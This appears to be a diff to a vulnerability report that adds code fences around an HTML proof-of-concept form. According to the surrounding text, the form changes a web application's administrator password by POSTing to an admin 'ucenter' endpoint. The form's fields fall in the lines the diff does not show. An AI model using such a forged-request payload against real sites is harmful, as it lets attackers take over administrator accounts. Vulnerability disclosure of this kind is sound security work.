@@ -1,6 +1,7 @@
 After logging in, change the administrator password using the following POC
 Password change to admin
 POC:
+```
 <html>
   <body>
     <form action="http://www.a.com/admin.php/Index/ucenter" method="POST">
@@ -14,3 +15,4 @@ POC:
     </form>
   </body>
 </html>
+```
